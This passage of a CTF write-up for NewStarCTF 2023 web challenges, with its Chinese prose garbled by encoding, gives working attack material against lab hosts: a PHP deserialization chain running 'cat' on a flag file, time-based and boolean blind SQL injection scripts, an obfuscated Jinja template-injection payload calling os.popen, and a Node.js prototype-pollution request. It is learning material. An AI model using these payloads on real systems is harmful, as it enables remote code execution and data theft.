}

<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();
<span class="hljs-variable">$poc</span>-&gt;qwejaskdjnlka = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();
<span class="hljs-variable">$poc</span>-&gt;qwejaskdjnlka-&gt;code = <span class="hljs-string">"cat /flag_is_h3eeere | t''ee 2"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<p>![image-20231029095757158](NewStarCTF 2023/image-20231029095757158.png)</p>
<p>æ‹¿åˆ°flag</p>
<h3 id="æ–¹æ³•äºŒbashç›²æ³¨">æ–¹æ³•äºŒï¼šbashç›²æ³¨</h3>
<p>è¿™é‡Œé¢„æœŸè§£åº”è¯¥æ˜¯bashç›²æ³¨çš„ï¼Œä¹Ÿå°±æ˜¯åœ¨æ¯æ¬¡ä½¿ç”¨å‘½ä»¤åä½¿ç”¨cutç­‰å‡½æ•°æˆªä¸€ä¸‹å­—ç¬¦ä¸²çš„æŸä¸€ä½è¿›è¡Œåˆ¤æ–­ï¼Œè¿™é‡Œå®˜æ–¹wpç»™äº†ä¸ªè„šæœ¬ï¼Œä½†æ˜¯è¿è¡Œèµ·æ¥å¾ˆè´¹åŠ²å•Šï¼Œå‡ºé”™ç‡å¾ˆé«˜ï¼Œä¼¼ä¹å¾—è¿è¡Œå¥½å‡ æ¬¡æ‰æœ‰å¯èƒ½å¾—åˆ°flag</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">"http://152fe0ae-26ba-4e15-a358-96dc061a2152.node4.buuoj.cn:81/"</span>
result = <span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">15</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
        <span class="hljs-comment">#asciiç è¡¨</span>
        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):
            k=<span class="hljs-built_in">chr</span>(k)
            payload =<span class="hljs-string">f"if [ `cat /flag_is_h3eeere | awk NR==<span class="hljs-subst">{i}</span> | cut -c <span class="hljs-subst">{j}</span>` == '<span class="hljs-subst">{k}</span>' ];then sleep 2;fi"</span>
            length=<span class="hljs-built_in">len</span>(payload)
            payload2 ={
                <span class="hljs-string">"payload"</span>: <span class="hljs-string">'O:7:"minipop":2:{{s:4:"code";N;s:13:"qwejaskdjnlka";O:7:"minipop":2:{{s:4:"code";s:{0}:"{1}";s:13:"qwejaskdjnlka";N;}}}}'</span>.<span class="hljs-built_in">format</span>(
                    length, payload)
            }
            t1=time.time()
            r=requests.post(url=url,data=payload2)
            t2=time.time()
            <span class="hljs-keyword">if</span> t2-t1 &gt;<span class="hljs-number">1.5</span>:
                result+=k
                <span class="hljs-built_in">print</span>(result)
    result += <span class="hljs-string">" "</span></code></pre>
<p>ç”±äºå’±ä¹Ÿä¸ä¼špyè„šæœ¬ï¼Œä¹Ÿä¸çŸ¥é“å¦‚ä½•æ”¹è¿›ã€‚ã€‚ã€‚ã€‚</p>
<h2 id="week3web-medium_sql">WEEK3|WEB-medium_sql</h2>
<p>![image-20231029104228759](NewStarCTF 2023/image-20231029104228759.png)</p>
<p>ä¾æ—§æ˜¯sqlæ³¨å…¥ä¸è¿‡å¯æƒ³è€ŒçŸ¥è¿™é‡Œè¿‡æ»¤è‚¯å®šæ›´å¤šï¼Œå½“æ—¶åšçš„æ—¶å€™ä¹Ÿæ˜¯æ²¡åšå‡ºæ¥ï¼Œæ¯•ç«Ÿæ˜¯èœé¸¡ã€‚çœ‹äº†wpå‘ç°ï¼Œè¿˜æ˜¯è¦å†™pyè„šæœ¬ï¼ˆå½“æ—¶æˆ‘ä¹Ÿåªæ˜¯åˆ¤æ–­å‡ºæ¥æ˜¯å¯ä»¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼Œä¸è¿‡æŠ¥é”™æ³¨å…¥æ²¡æœ‰æŠ¥é”™å›æ˜¾ï¼‰è€Œå½“æ—¶ä¹Ÿä¸ä¼šå†™å…³äºç›²æ³¨è„šæœ¬ï¼Œäºæ˜¯å°±æ”¾å¼ƒäº†ã€‚ä»Šå¤©å­¦ä¸€ä¸‹å¦‚ä½•å†™</p>
<p>åœ¨week1çš„åŸºç¡€ä¸Šï¼Œå¤šè¿‡æ»¤äº†unionã€‚</p>
<p>IFå‡½æ•°ç”¨æ³•ï¼š</p>
<pre><code class="hljs plaintext">IFå‡½æ•°æ ¹æ®åˆ¤æ–­æ¡ä»¶æ˜¯å¦æˆç«‹è¿›è¡Œé€‰æ‹©æ‰§è¡Œï¼Œæˆç«‹æ—¶æ‰§è¡Œä¸€æ¡è¯­å¥ï¼Œä¸æˆç«‹æ—¶æ‰§è¡Œå¦ä¸€æ¡è¯­å¥

è¯­æ³•ç»“æ„
	IF(condition, value_if_true, value_if_false)
å‚æ•°è¯´æ˜
    condition: åˆ¤æ–­æ¡ä»¶
    value_if_true: å¦‚æœconditionçš„ç»“æœä¸ºTRUEï¼Œè¿”å›è¯¥å€¼
    value_if_false: å¦‚æœconditionçš„ç»“æœä¸ºFALSEï¼Œè¿”å›è¯¥å€¼</code></pre>
<p>éªŒè¯å­˜åœ¨å¸ƒå°”ç›²æ³¨ï¼š</p>
<pre><code class="hljs plaintext">?id=TMP0919' And if(1&gt;0,1,0)#

?id=TMP0919' And if(0&gt;1,1,0)#</code></pre>
<p>ä¸Šé¢æ˜¯å®˜æ–¹wpç»™å‡ºçš„åˆ¤æ–­ï¼Œè¿™é‡Œæˆ‘å¤ç°ç¼ºä¸æˆåŠŸï¼Œä¹‹åæˆ‘æ¢æˆäº†â€“+æ³¨é‡Šä¾¿æˆåŠŸäº†</p>
<p>![image-20231029105300325](NewStarCTF 2023/image-20231029105300325.png)</p>
<p>å¦‚æœæ˜¯#æ³¨é‡Šçš„è¯ï¼Œä¼šæœ‰ä¸‹å›¾æŠ¥é”™ï¼Œè¯´æ˜¯æµè§ˆå™¨æ— æ³•è§£æä½ æ‰€å‘é€çš„è¯·æ±‚ã€‚ã€‚ã€‚ã€‚</p>
<p>![image-20231029105409952](NewStarCTF 2023/image-20231029105409952.png)</p>
<p>æ­£ç¡®payloadå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs plaintext">?id=TMP0919' And if(1&gt;0,1,0)--+

?id=TMP0919' And if(0&gt;1,1,0)--+</code></pre>
<p>å‘ç°ç¬¬ä¸€ä¸ªæœ‰å›æ˜¾ï¼Œç¬¬äºŒä¸ªä¼šæŠ¥é”™è¯´ï¼šidä¸å­˜åœ¨ï¼Œæ•…å­˜åœ¨å¸ƒå°”ç›²æ³¨</p>
<p>è¿™é‡Œç›´æ¥ä¸Špyè„šæœ¬äº†ï¼ˆç”¨çš„äºŒåˆ†æŸ¥æ‰¾ï¼Œå¾ˆé«˜æ•ˆï¼‰</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">condition</span>(<span class="hljs-params">res</span>):
    <span class="hljs-comment">#åˆ¤æ–­å›æ˜¾å†…å®¹ä¸­æ˜¯å¦æœ‰å…³é”®è¯</span>
    <span class="hljs-keyword">if</span> <span class="hljs-string">'Physics'</span> <span class="hljs-keyword">in</span> res.text:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

result = <span class="hljs-string">''</span>
_url = <span class="hljs-string">'http://574acc4c-77b6-4ebe-8f29-28c546083e86.node4.buuoj.cn:81/'</span>

<span class="hljs-keyword">for</span> _time <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"time:%d"</span> % (_time))
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    <span class="hljs-keyword">while</span> (right &gt; left):
        mid = (left + right) // <span class="hljs-number">2</span>
        <span class="hljs-comment"># è·å–å½“å‰åº“è¡¨å</span>
        <span class="hljs-comment"># url = f"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(table_name))fRom(infOrmation_schema.tables)whEre((tAble_schema) In (dAtabase()))) fRom {_time} FOr 1))))In({mid})),1,0)%23"</span>
        url = <span class="hljs-string">f"<span class="hljs-subst">{_url}</span>?id=TMP0919' And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom <span class="hljs-subst">{_time}</span> FOr 1))))In(<span class="hljs-subst">{mid}</span>)),1,0)%23"</span>
        <span class="hljs-comment"># è·å–å­—æ®µå</span>
        <span class="hljs-comment"># url = f"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(column_name))fRom(infOrmation_schema.columns)whEre((tAble_name) In ('here_is_flag'))) fRom {_time} FOr 1))))In({mid})),1,0)%23"</span>
        <span class="hljs-comment"># è·å–å­—æ®µå€¼</span>
        time.sleep(<span class="hljs-number">0.2</span>)
        res = requests.get(url=url)
        <span class="hljs-keyword">if</span> (condition(res)):
            result += <span class="hljs-built_in">chr</span>(mid)
            <span class="hljs-built_in">print</span>(result)
            <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># è·å–å½“å‰åº“è¡¨å</span>
            <span class="hljs-comment"># url = f"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(table_name))fRom(infOrmation_schema.tables)whEre((tAble_schema) In (dAtabase()))) fRom {_time} FOr 1))))&gt;({mid})),1,0)%23"</span>
            <span class="hljs-comment"># è·å–å­—æ®µå</span>
            <span class="hljs-comment"># url = f"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(column_name))fRom(infOrmation_schema.columns)whEre((tAble_name) In ('here_is_flag'))) fRom {_time} FOr 1))))&gt;({mid})),1,0)%23"            </span>
            <span class="hljs-comment"># è·å–å­—æ®µå€¼</span>
            url = <span class="hljs-string">f"<span class="hljs-subst">{_url}</span>?id=TMP0919' And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom <span class="hljs-subst">{_time}</span> FOr 1))))&gt;(<span class="hljs-subst">{mid}</span>)),1,0)%23"</span>
            res = requests.get(url=url)
            <span class="hljs-keyword">if</span> (condition(res)):
                left = mid
            <span class="hljs-keyword">else</span>:
                right = mid</code></pre>
<p>æ€è·¯å°±æ˜¯å…ˆæ„é€ urlï¼Œæ¥ç€ç¬¬ä¸€ä¸ªå¾ªç¯å®šä¹‰äº†ä¸ªtimeå˜é‡ï¼Œç”¨é€”è®°å½•å½“å‰æŸ¥è¯¢è¿›ç¨‹çš„åŒæ—¶ï¼Œå¯ä¼šåœ¨åç»­èµ·åˆ°æˆªå–ä¸€ä¸ªå­—ç¬¦çš„ä½œç”¨ï¼Œç”¨äºåŒ¹é…asciiç å€¼æ˜¯å¦ç›¸ç­‰ã€‚éšåå®šä¹‰äº†leftï¼Œrightç”¨äºäºŒåˆ†æŸ¥æ‰¾ï¼Œåªæœ‰å½“rightå¤§äºleftååœ¨è¿›å…¥å¾ªç¯ï¼Œéšåå®šä¹‰ä¸€ä¸ªä¸­é—´å€¼mid</p>
<pre><code class="hljs py">url = <span class="hljs-string">f"<span class="hljs-subst">{_url}</span>?id=TMP0919' And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom <span class="hljs-subst">{_time}</span> FOr 1))))In(<span class="hljs-subst">{mid}</span>)),1,0)%23"</span></code></pre>
<p>è¿™é‡Œæ˜¯æˆ‘ä»¬è¦æŸ¥æ‰¾çš„payloadï¼Œæ€è·¯å°±æ˜¯å…ˆæ˜¯å¯»å¸¸sqlè¯­å¥ï¼Œselectâ€¦fromâ€¦ä¹‹åé€šè¿‡from time for 1æå–æŸä¸€ä¸ªç¡®å®šå­—ç¬¦ï¼Œordè½¬æ¢æˆasciiå€¼ï¼Œå†ä¸å½“å‰midå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰åˆ™å¡«å……åˆ°resultç»“æœä¸­ï¼Œå¦‚æœä¸æƒ³ç­‰ï¼Œåˆ™åˆ¤æ–­å½“å‰ordå€¼ä¸midå€¼çš„å¤§å°ï¼Œè¿›è€Œåˆ¤æ–­åç»­midå€¼çš„å–æ³•ã€‚</p>
<p>æˆ‘å†ç»ƒä¹ ä¸€æ³¢ä¸Šè¿°ä»£ç çš„ç¼–å†™å°±okäº†ï¼</p>
<p>![image-20231029141425644](NewStarCTF 2023/image-20231029141425644.png)</p>
<h2 id="week3web-genshin">WEEK3|WEB-GenShin</h2>
<p>![image-20231029150138096](NewStarCTF 2023/image-20231029150138096.png)</p>
<p>è¿™é‡Œæç¤ºæˆ‘ä»¬æ‰¾ä¸€äº›ä¿¡æ¯ï¼Œçœ‹äº†wpçŸ¥é“åœ¨å“åº”å¤´ä¸­æœ‰ä¸€ä¸ªPopå¤´ï¼ŒåŒ…å«ç€ä¸€ä¸ªè·¯ç”±ï¼Œä½†æˆ‘æœå¯»äº†ä¸€ç•ªä¹Ÿæ²¡å‘ç°Popçš„ä½œç”¨ï¼Œå¯èƒ½å°±æ˜¯å‡ºé¢˜äººè‡ªå·±è®¾ç½®çš„å§</p>
<p>![image-20231029150249693](NewStarCTF 2023/image-20231029150249693.png)</p>
<p>æˆ‘ä»¬æ·»åŠ è¯¥urlè®¿é—®çœ‹åˆ°é¡µé¢è¦æ±‚æˆ‘ä»¬ç»™nameè¿›è¡Œgetä¼ å‚</p>
<p>![image-20231029150313194](NewStarCTF 2023/image-20231029150313194.png)</p>
<p>è¿™é‡Œåˆšä¼ äº†ä¸€ä¸‹å°±è¢«banäº†ã€‚ã€‚ã€‚ä¹‹åæˆ‘ä¹Ÿå°±ä¸çŸ¥é“äº†ï¼Œåˆå¾—çœ‹wpï¼Œä»–æ˜¯è¿™æ ·è¯´çš„ï¼š</p>
<pre><code class="hljs plaintext">é¦–å…ˆå°è¯•ä¸€ä¸‹æ™®é€šçš„{{7*7}}ï¼Œå› ä¸ºè¢«è¿‡æ»¤äº†è¿ç»­çš„{{ï¼Œæ‰€ä»¥è¿™é‡Œå›æ˜¾ä¸äº†

é‚£ä¹ˆåªæœ‰ç”¨å¦ä¸€ä¸ªæ–¹æ³•äº†ï¼Œåœ¨{% %}é‡Œé¢å¯ä»¥æ‰§è¡Œpythonå‘½ä»¤ï¼Œåªè¦ä¸æŠ¥é”™å°±è¡Œï¼Œæ¯”å¦‚</code></pre>
<p>å…¶å®æ¯æ¬¡æˆ‘ä»¬é‡åˆ°è¿™ç§é¢˜ç›®éƒ½æ˜¯åº”è¯¥å»fuzzä¸€ä¸‹ï¼Œçœ‹çœ‹è¿‡æ»¤äº†é‚£äº›å­—ç¬¦ï¼Œä½†æˆ‘ä¹Ÿä¸çŸ¥é“å¦‚ä½•å»fuzzï¼Œåªæ˜¯æ„Ÿè§‰æ˜¯å»æä¸€ä¸ªä¸“é—¨çš„å­—å…¸å»çˆ†ç ´çœ‹å›æ˜¾çŠ¶æ€ï¼ˆä½†å¿ƒé‡Œä¹Ÿæ²¡åº•ï¼‰</p>
<p>![image-20231029150632111](NewStarCTF 2023/image-20231029150632111.png)</p>
<p>å¦‚ä¸Šå›¾æˆ‘ä»¬æˆåŠŸæ‰§è¡Œï¼Œæ¥ä¸‹æ¥æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦å­˜åœ¨key</p>
<p>![image-20231029151043843](NewStarCTF 2023/image-20231029151043843.png)</p>
<p>å¦‚ä¸Šå›¾æ˜¯ä¸å­˜åœ¨çš„ï¼Œé‚£å°±æ˜¯å¸¸è§„æ€è·¯ï¼šæ‹¿åˆ°ç›¸å…³å‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹å­ç±»</p>
<pre><code class="hljs plaintext">?name={%print("".__class__.__base__.__subclasses__())%}</code></pre>
<p>![image-20231029151546824](NewStarCTF 2023/image-20231029151546824.png)</p>
<p>è¿™é‡ŒæˆåŠŸåœ¨132å¤„æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„å‡½æ•°ï¼Œä½†æ¥ä¸‹æ¥å‘ç°initè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬é‡‡ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡</p>
<pre><code class="hljs plaintext">?name={%print("".__class__.__base__.__subclasses__()[132]|attr("__in"+"it__")|attr("__globals__"))%}</code></pre>
<p>![image-20231029152337985](NewStarCTF 2023/image-20231029152337985.png)</p>
<p>è¿™é‡Œé‡‡ç”¨evalå‡½æ•°ï¼Œéšåè¿›è¡Œåˆ©ç”¨çš„æ—¶å€™å‘ç°å°†osç­‰è¿‡æ»¤äº†ï¼Œè¿™é‡Œæƒ³é‡‡ç”¨unicodeç¼–ç çš„ï¼Œä½†ä¹Ÿæ˜¯è¢«è¿‡æ»¤äº†ï¼Œä¹‹ååˆå°è¯•base64ä¹Ÿæ˜¯ä¸è¡Œ</p>
<p>çœ‹äº†wpå‘ç°è¿™é‡Œè¦ç”¨chrç¼–ç ç»•è¿‡</p>
<pre><code class="hljs plaintext">eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41))</code></pre>
<p>å¦‚ä¸Šæ˜¯ä»–çš„payloadï¼Œä½†è¿™é‡Œæœ‰ä¸ªå‘ï¼Œä»–ä»¬ä¹‹é—´ä¸å¯ç”¨å°æ•°ç‚¹è¿æ¥ï¼Œä¸ç„¶pyä¼šè®¤ä¸ºåè€…æ˜¯å‰è€…çš„å±æ€§ï¼Œè€Œè¿™ä¸ªå¸ˆå‚…é‡‡ç”¨%2bè¿æ¥ä¹Ÿå°±æ˜¯+å·ï¼Œä½†æ˜¯ä½ ç›´æ¥å†™å…¥+å·ä¹Ÿä¸å¯ï¼Œå½“ä½ è¿™æ ·è¾“å…¥ä¼šå‘ç°ï¼Œurlå°†å…¶å½“åšç©ºæ ¼ã€‚æ•…ä»–é‡‡ç”¨%2bè¿æ¥</p>
<p>æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs plaintext">?name={%print("".__class__.__base__.__subclasses__()[132]|attr("__in"+"it__")|attr("__globals__")|attr("get")("__builtins__")|attr("get")("eval")("eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41))"))%}</code></pre>
<p>![image-20231029155143561](NewStarCTF 2023/image-20231029155143561.png)</p>
<p>æ‹¿åˆ°flag</p>
<h2 id="week3web-otenkigirl">WEEK3|WEB-OtenkiGirl</h2>
<p>ä¸€é“nodejsåŸå‹é“¾æ±¡æŸ“çš„é¢˜ç›®ï¼Œæˆ‘å¯¹è¿™ä¸€å—å„¿æŒæ¡å¾ˆå°‘ï¼Œè™½ç„¶åœ¨æ­¤ä¹‹å‰å­¦ä¹ äº†ä¸€æ³¢ï¼Œä½†è¿˜æ˜¯ä¸ç†Ÿç»ƒï¼Œä¸‹é¢è·Ÿç€wpèµ°ä¸€é</p>
<p>![image-20231030213459589](NewStarCTF 2023/image-20231030213459589.png)</p>
<p>é¦–å…ˆæˆ‘ä»¬éšä¾¿è¾“å…¥ä¿¡æ¯ï¼ŒæŠ“åŒ…çœ‹ä¸€ä¸‹</p>
<p>![image-20231030213641774](NewStarCTF 2023/image-20231030213641774.png)</p>
<p>å‘ç°æ˜¯ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼Œæ•°æ®æ ¼å¼ä¸ºjsonã€‚æ¥ä¸‹æ¥åˆ†æä¸€æ³¢é¢˜ç›®ç»™çš„é™„ä»¶ï¼Œè¿™é‡Œå…ˆçœ‹çœ‹app.jsçš„å†…å®¹</p>
<p>![image-20231030215106140](NewStarCTF 2023/image-20231030215106140.png)</p>
<p>å¦‚ä¸Šå›¾ï¼Œæ„Ÿè§‰é‡ç‚¹å°±æ˜¯ç»™äº†ä¸¤ä¸ªè·¯ç”±ï¼šinfoå’Œsubmitï¼Œå¹¶ä¸”è¿˜åˆ¤æ–­äº†ä¸€ä¸‹è¯·æ±‚åŒ…çš„æŸäº›æ•°æ®æ˜¯å¦ç¬¦åˆè§„å®šï¼Œå†å†³å®šæ˜¯å¦å›æ˜¾æ­£ç¡®æ•°æ®ã€‚</p>
<p>é‚£æˆ‘ä»¬æ¥ä¸‹æ¥çœ‹çœ‹submit.jså’Œinfo.js</p>
<p>å…¶ä¸­submitä¸­çš„é‡ç‚¹æˆ‘æ„Ÿè§‰å°±æ˜¯mergeå‡½æ•°ï¼Œè¿™é‡Œè‚¯å®šå°±æ˜¯æ¼æ´åˆ©ç”¨ç‚¹äº†ï¼Œä½†æˆ‘ä»¬è¿˜ä¸æ¸…æ¥šæ¼æ´åœ¨å“ªé‡Œï¼Œæ¥ä¸‹æ¥åœ¨çœ‹çœ‹info</p>
<p>![image-20231030214323684](NewStarCTF 2023/image-20231030214323684.png)</p>
<p>ä½†çœ‹äº†åŠå¤©ä¹Ÿçœ‹ä¸æ‡‚ï¼Œåªæ€ªè‡ªå·±ä»£ç å®¡è®¡ä¸è¡Œå•Šï¼Œçœ‹wpå¦‚ä½•åˆ†æå§</p>
<p>æŸ¥çœ‹<code>routes/info.js</code>æºç ï¼Œè€ƒå¯Ÿä»æ•°æ®åº“ä¸­è·å–æ•°æ®çš„å‡½æ•°<code>getInfo</code></p>
<pre><code class="hljs js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getInfo</span>(<span class="hljs-params">timestamp</span>) {

    timestamp = <span class="hljs-keyword">typeof</span> timestamp === <span class="hljs-string">"number"</span> ? timestamp : <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();

    <span class="hljs-comment">// Remove test data from before the movie was released</span>

    <span class="hljs-keyword">let</span> minTimestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">min_public_time</span> || <span class="hljs-variable constant_">DEFAULT_CONFIG</span>.<span class="hljs-property">min_public_time</span>).<span class="hljs-title function_">getTime</span>();

    timestamp = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(timestamp, minTimestamp);

    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> sql.<span class="hljs-title function_">all</span>(<span class="hljs-string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> { <span class="hljs-keyword">throw</span> e });

    <span class="hljs-keyword">return</span> data;
}</code></pre>
<p>å…¶ä¸­ç¬¬4è¡Œå’Œç¬¬5è¡Œå°†æˆ‘ä»¬ä¼ å…¥çš„<code>timestamp</code>åšäº†ä¸€ä¸ªè¿‡æ»¤ï¼Œä½¿å¾—æ‰€è¿”å›çš„æ•°æ®ä¸æ—©äºé…ç½®æ–‡ä»¶ä¸­çš„<code>min_public_time</code></p>
<p>å…·ä½“è§£é‡Šä¸ºï¼š</p>
<pre><code class="hljs plaintext">è¿™è¡Œä»£ç åˆå§‹åŒ–ä¸€ä¸ªminTimestampå˜é‡ã€‚å®ƒä»é…ç½®å¯¹è±¡CONFIGä¸­è·å–min_public_timeå±æ€§çš„å€¼ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä½¿ç”¨é»˜è®¤é…ç½®å¯¹è±¡DEFAULT_CONFIGä¸­çš„min_public_timeå±æ€§çš„å€¼ã€‚ç„¶åï¼Œé€šè¿‡new Date()æ„é€ å‡½æ•°å°†è¯¥æ—¶é—´è½¬æ¢ä¸ºä¸€ä¸ªæ—¥æœŸå¯¹è±¡ï¼Œå¹¶ä½¿ç”¨getTime()æ–¹æ³•è·å–å…¶å¯¹åº”çš„æ—¶é—´æˆ³ã€‚</code></pre>
<p>æŸ¥çœ‹æ ¹ç›®å½•ä¸‹çš„<code>config.js</code>å’Œ<code>config.default.js</code>åå‘ç°<code>config.js</code>å¹¶æ²¡æœ‰é…ç½®<code>min_public_time</code>ï¼Œå› æ­¤<code>getInfo</code>çš„ç¬¬5è¡Œåªæ˜¯é‡‡ç”¨äº†<code>DEFAULT_CONFIG.min_public_time</code> --è¿™é‡Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥å®ç°å°†å…¶è¿”å›ä¸€ä¸ªæ¯”<code>min_public_time</code>è¿˜è¦æ—©çš„æ—¶é—´ï¼Œè¯´ä¸å®šå°±ä¼šæ‰¾åˆ°flag</p>
<p>![image-20231030221439241](NewStarCTF 2023/image-20231030221439241.png)</p>
<p>è€ƒè™‘åŸå‹é“¾æ±¡æŸ“æ±¡æŸ“<code>min_public_time</code>ä¸ºæˆ‘ä»¬æƒ³è¦çš„æ—¥æœŸï¼Œå°±èƒ½ç»•è¿‡æœ€æ—©æ—¶é—´é™åˆ¶ï¼Œè·å–ä»»æ„æ—¶é—´çš„æ•°æ®</p>
<p>ç»“åˆ<code>routes/submit.js</code>æºç çš„æ³¨å…¥ç‚¹</p>
<p>![image-20231030221603437](NewStarCTF 2023/image-20231030221603437.png)</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨è¿™é‡Œä»–å°†æ•°æ®dataèµ‹å€¼ç»™DEFAULTå‚æ•°ï¼Œè€Œè¯¥å‚æ•°ä¸­åªå«æœ‰dateå’Œplaceï¼Œé‚£æˆ‘ä»¬ç›´æ¥ä¿®æ”¹dataçš„<code>data['__proto__']['min_public_time']</code>å€¼å³å¯ï¼Œpayloadå¦‚ä¸‹</p>
<pre><code class="hljs json"><span class="hljs-punctuation">{</span><span class="hljs-attr">"contact"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"asd"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"reason"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"asd"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"__proto__"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">{</span><span class="hljs-attr">"min_public_time"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"1001-01-01"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span></code></pre>
<p>![image-20231030222312128](NewStarCTF 2023/image-20231030222312128.png)</p>
<p>ä¹‹åè®¿é—®/info/0ä¼šå‘ç°å¤šå‡ºå¾ˆå¤šä¿¡æ¯ï¼Œå…¶ä¸­æ‰¾åˆ°flagï¼Œè¿™é‡Œæ³¨æ„ä¸Šä¸‹å›¾çš„è§£ææ ¼å¼ï¼Œä¸Šé¢ä¸ºapplication/jsonï¼Œä¸‹é¢çš„å¦‚ä¸‹å›¾</p>
<p>![image-20231030222453202](NewStarCTF 2023/image-20231030222453202.png)</p>
<p>è‡³äºä¸Šè¿°ä¸ºä½•è¦è®¿é—®/info/0è¿™ä¸ªè·¯ç”±æ˜¯å› ä¸ºä¸‹é¢çš„ä»£ç </p>
<p>![image-20231030222701126](NewStarCTF 2023/image-20231030222701126.png)</p>
<p>å¦‚ä¸Šå›¾ï¼Œinfo/0ï¼Œè¿™é‡Œçš„0æ˜¯å¯å˜çš„ï¼Œä¹‹åä»–ä¼šæ£€æŸ¥content-typeç­‰ç­‰ï¼Œä¹‹åæ²¡é—®é¢˜çš„è¯ä¼šè°ƒç”¨getinfoå‡½æ•°æŸ¥è¯¢æ•°æ®åº“ï¼Œå›æ˜¾å†…å®¹ã€‚</p>
